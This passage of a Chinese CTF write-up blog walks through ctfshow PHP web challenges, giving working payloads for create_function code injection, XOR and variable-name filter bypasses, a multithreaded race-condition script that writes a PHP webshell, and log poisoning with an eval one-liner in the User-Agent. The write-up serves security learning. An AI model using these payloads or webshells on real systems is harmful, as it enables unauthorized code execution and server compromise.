<li><strong><code>i</code></strong>: 忽略大小写。由于字符集合中只有小写字母，这个修饰符使得正则表达式同时也匹配大写字母。</li>
<li><strong><code>s</code></strong>: 使得 <code>.</code> 可以匹配换行符，但在此正则表达式中没有使用 <code>.</code>，所以这个修饰符没有实际影响。</li>
<li><strong><code>D</code></strong>: 表示 “dollar end only”，也就是说 <code>$</code> 只匹配字符串的结尾。这在某些情况下会影响匹配行为，但在这个具体正则中，<code>D</code> 修饰符没有特别的影响。</li>
</ul>
<p>输出可用字符:! “ # $ % &amp; ‘ ( ) * + , - . &#x2F; : ; &lt; &#x3D; &gt; ? @ [ \ ] ^ &#96; { | } ~ </p>
<p>关于create_function函数注入</p>
<h4 id="create-funtion函数"><a href="#create-funtion函数" class="headerlink" title="create_funtion函数"></a>create_funtion函数</h4><p><code>create_function</code> 是 PHP 中的一个函数，用于动态创建匿名函数</p>
<p>基础语法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$function</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$args&#x27;</span>, <span class="string">&#x27;code&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>$args</code> 是一个用逗号分隔的参数列表。</li>
<li><code>code</code> 是函数体的代码。</li>
</ul>
<p>由于php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法</p>
<p>create_function()代码注入：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;123&quot;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">就相当于</span></span><br><span class="line"><span class="string">function ($a)&#123;</span></span><br><span class="line"><span class="string">	echo $a.&quot;123&quot;;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br></pre></td></tr></table></figure>

<p>我们来做个直观的代码方便观看</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">funtion <span class="built_in">f</span>($a)&#123;</span><br><span class="line">	echo <span class="number">1</span>;&#125;<span class="built_in">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line">就是</span><br><span class="line">function <span class="built_in">f</span>($a)&#123;</span><br><span class="line">	echo <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">phpinfo</span>();</span><br></pre></td></tr></table></figure>

<p>但是这里原则上会多出一个}，这样该怎么处理呢?我们可用参考sql注入中的主动闭合+注释</p>
<p>payload</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">show</span>=&#125;<span class="built_in">system</span>(<span class="string">&quot;tac f*&quot;</span>);/*     <span class="comment">//GET</span></span><br><span class="line">ctf=\create_function           <span class="comment">//POST</span></span><br></pre></td></tr></table></figure>

<h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><h3 id="中文变量绕过"><a href="#中文变量绕过" class="headerlink" title="#中文变量绕过"></a>#中文变量绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到flag在get_ctfshow_flag()方法里面，只要调用了这个方法就能输出flag</p>
<p>我们还可以看到eval函数，eval函数会将我们输入的code参数的值作为php代码执行，那我们看看能不能通过eval函数去调用get_ctfshow-flag()方法呢</p>
<p>方法一就是正常的异或绕i过了，因为没过滤^符号</p>
<p>payload:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(<span class="string">&quot;<span class="variable">%0</span>8<span class="variable">%0</span>2<span class="variable">%0</span>8<span class="variable">%0</span>9<span class="variable">%0</span>5<span class="variable">%0d</span>&quot;</span>^<span class="string">&quot;%7b%7b%7b%7d<span class="variable">%6</span>0<span class="variable">%60</span>&quot;</span>)(<span class="string">&quot;<span class="variable">%0</span>9<span class="variable">%0</span>1<span class="variable">%0</span>3<span class="variable">%0</span>1<span class="variable">%0</span>6<span class="variable">%02</span>&quot;</span>^<span class="string">&quot;%7d<span class="variable">%6</span>0<span class="variable">%6</span>0<span class="variable">%2</span>1<span class="variable">%6</span>0<span class="variable">%28</span>&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119161418545.png" alt="image-20241119161418545"></p>
<p>方法二:中文变量绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?code=$给特=<span class="string">&quot;%60%7B%7B%7B&quot;</span>%<span class="number">5</span>E<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;$给特&#125;[参数一]($&#123;$给特&#125;[参数二]);&amp;参数一=system&amp;参数二=tac%<span class="number">20</span>f*</span><br><span class="line"></span><br><span class="line"><span class="comment">//?code=$给特=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$给特&#125;[参数一]($&#123;$给特&#125;[参数二]);&amp;参数一=system&amp;参数二=tac f*</span></span><br><span class="line"><span class="comment">//&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; 异或出来的结果是 _GET</span></span><br><span class="line"><span class="comment">//也可以    $&#123;_GET&#125;[哼]($&#123;_GET&#125;[嗯]);&amp;哼=call_user_func&amp;嗯=get_ctfshow_fl0g</span></span><br></pre></td></tr></table></figure>

<h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><h3 id="删除文件的条件竞争"><a href="#删除文件的条件竞争" class="headerlink" title="#删除文件的条件竞争"></a>#删除文件的条件竞争</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里进行了一个扫描目录的操作，并根据条件执行删除文件的指令</p>
<ol>
<li><strong><code>scandir(&#39;./&#39;)</code></strong>:<ul>
<li><code>scandir</code> 函数用于扫描指定目录，返回文件和子目录的列表。</li>
<li><code>&#39;./&#39;</code> 表示当前目录。</li>
</ul>
</li>
<li><strong><code>unlink($file)</code></strong>:<ul>
<li><code>unlink</code> 函数用于删除文件</li>
</ul>
</li>
</ol>
<h4 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h4><p>因为不会删除index.php，所以我这里有想到一个非预期解，就是往index.php里面写一句话</p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119162822769.png" alt="image-20241119162822769"></p>
<p>然后用蚁剑连接木马就可以了</p>
<h4 id="预期解-条件竞争进行访问"><a href="#预期解-条件竞争进行访问" class="headerlink" title="预期解:条件竞争进行访问"></a>预期解:条件竞争进行访问</h4><p>用脚本进行条件竞争</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  <span class="comment"># 导入requests库，用于发送HTTP请求。  </span></span><br><span class="line"><span class="keyword">import</span> io  <span class="comment"># 导入io库，用于处理输入输出流，这里主要用于创建字节流。  </span></span><br><span class="line"><span class="keyword">import</span> threading  <span class="comment"># 导入threading库，用于实现多线程。  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 定义目标URL和会话ID。  </span></span><br><span class="line">url=<span class="string">&#x27;http://db1dc1a9-61c8-4e0b-94df-e0525c7f9192.challenge.ctf.show/&#x27;</span>  <span class="comment"># 目标网站的URL。    </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 构造要发送的数据，尝试在服务器上写入一句话木马。  </span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 定义write函数，用于通过发送大量文件上传请求来尝试写入木马文件。  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;show&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat /ctfshow_fl0g_here.txt&quot;);?&gt;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        requests.post(url=url+<span class="string">&#x27;?ctf=1.php&#x27;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = requests.get(url + <span class="string">&#x27;1.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">404</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        threading.Thread(target=write).start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        threading.Thread(target=read).start()</span><br></pre></td></tr></table></figure>

<h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><h3 id="文件包含非预期绕过"><a href="#文件包含非预期绕过" class="headerlink" title="#文件包含非预期绕过"></a>#文件包含非预期绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];<span class="comment">//获取查询字符串</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);<span class="comment">//将 $_GET 数组中的键值对提取出来，并将键作为变量名</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;	<span class="comment">// 如果指定类(CTFSHOW)存在，则输出提示信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果 $isVIP 为真且 ctf 字符串中不包含冒号</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里首先看到的是include函数，第一时间想到的是文件包含，然后我们去看过滤，这里会对get传入的参数进行key的过滤，这里有一个isVIP参数和ctf参数，后者是通过post传参但前者似乎没有定义传参方式，那我们就get传就行，这样的话我们采用日志注入来做试试</p>
<p>为什么使用日志注入?</p>
<p>因为$key进行了字符的过滤，所以我们不能通过get传参传入木马,正常的文件包含行不通，所以我们需要进行日志文件包含或者session文件包含</p>
<h3 id="日志注入"><a href="#日志注入" class="headerlink" title="日志注入"></a>日志注入</h3><p>先看服务器</p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119170818864.png" alt="image-20241119170818864"></p>
<p>是nginx服务器，</p>
<p>日志文件路径：</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apache一般是/<span class="built_in">var</span>/<span class="built_in">log</span>/apache/access.<span class="built_in">log</span>。</span><br><span class="line">nginx的<span class="built_in">log</span>在/<span class="built_in">var</span>/<span class="built_in">log</span>/nginx/access.<span class="built_in">log</span>和/<span class="built_in">var</span>/<span class="built_in">log</span>/nginx/<span class="built_in">error</span>.<span class="built_in">log</span>。</span><br></pre></td></tr></table></figure>

<p> 然后我们进行抓包，并往ua头写入一句话木马</p>
<p>UA头：<code>&lt;?php eval($_POST[1]);?&gt;</code></p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119170916708.png" alt="image-20241119170916708"></p>
<p>包含日志文件，进行RCE</p>
<p>?isVIP&#x3D;true                                         &#x2F;&#x2F;GET<br>ctf&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&amp;1&#x3D;system(“tac flag.php”);   &#x2F;&#x2F;POST</p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241119171251145.png" alt="image-20241119171251145"></p>
<p>这里的话用session文件包含也是可以的，大家都可以试一下</p>
<h2 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150_plus"></a>web150_plus</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>,<span class="string">&quot;log&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个相对上一题的话是禁用了日志注入的，不过这个出题人也是有点坑咱哈，在isVIP方法后门就结束了对CTFSHOW类的描述，所以__autoload()方法并不属于CTFSHOW类</p>
<p>那我们分析一下这个额外的方法</p>
<h3 id="autoload"><a href="#autoload" class="headerlink" title="__autoload"></a>__autoload</h3><p>这是PHP中一个特殊函数，用于在需要但尚未定义的类被实例化时自动加载类文件</p>
<p>__autoload 尝试加载未定义的类，在进行if(class_exists($<strong>CTFSHOW</strong>))判断时，会自动调用__autoload 这个方法。那么我们直接让__CTFSHOW__等于phpinfo，在调用__autoload时后面会执行$class()；，即执行phpinfo()。</p>
<p>但是在正则匹配中过滤了下划线，导致我们无法正常的传入__CTFSHOW__类，这时候应该怎么办呢？</p>
<p>联想到关于php 中变量名的命名规则，当变量名解析过程中碰到小数点的时候会自动将小数点化成下划线</p>
<p>所以我们的payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241124135802550.png" alt="image-20241124135802550"></p>
<p>然后在里面搜索flag就可以了</p>
<p><img src="/./../image/achieve/202411/php%E7%89%B9%E6%80%A7---ctfshow/image-20241124135840096.png" alt="image-20241124135840096"></p>

    </div>

    
    
    
	
	<div>
	  
		
<div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>

	  
	</div>


    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>wanTh3flag
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://wanth3f1ag.top/2024/11/10/web%E5%85%A5%E9%97%A8php%E7%AF%87-ctfshow(%E5%B7%B2%E5%81%9A%E5%AE%8C)/" title="web入门php篇-ctfshow(已做完)">https://wanth3f1ag.top/2024/11/10/web入门php篇-ctfshow(已做完)/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/php%E7%89%B9%E6%80%A7/" rel="tag"># php特性</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/11/07/2024%E7%8E%84%E6%AD%A6%E6%9D%AFwp--web%E6%96%B9%E5%90%91(%E5%B7%B2%E5%81%9A%E5%AE%8C)/" rel="prev" title="2024玄武杯wp--web方向(已做完)">
                  <i class="fa fa-angle-left"></i> 2024玄武杯wp--web方向(已做完)
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019wp--web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/" rel="next" title="极客大挑战2019wp--web(已做完)">
                  极客大挑战2019wp--web(已做完) <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">3m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">45:12</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
